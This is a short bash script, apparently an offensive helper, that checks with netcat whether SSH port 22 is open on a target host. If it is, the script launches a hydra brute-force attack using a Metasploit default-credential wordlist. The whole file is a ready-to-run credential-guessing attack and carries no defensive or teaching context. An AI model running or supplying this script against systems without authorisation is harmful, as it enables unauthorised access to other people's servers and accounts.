#!/bin/bash

WAIT_SEC=1
DPORT=22

nc -w $WAIT_SEC $1 $DPORT 2> /dev/null && {
	echo 'bruteforcing ssh'

	hydra -C /usr/share/wordlists/metasploit/piata_ssh_userpass.txt "ssh://$1"
}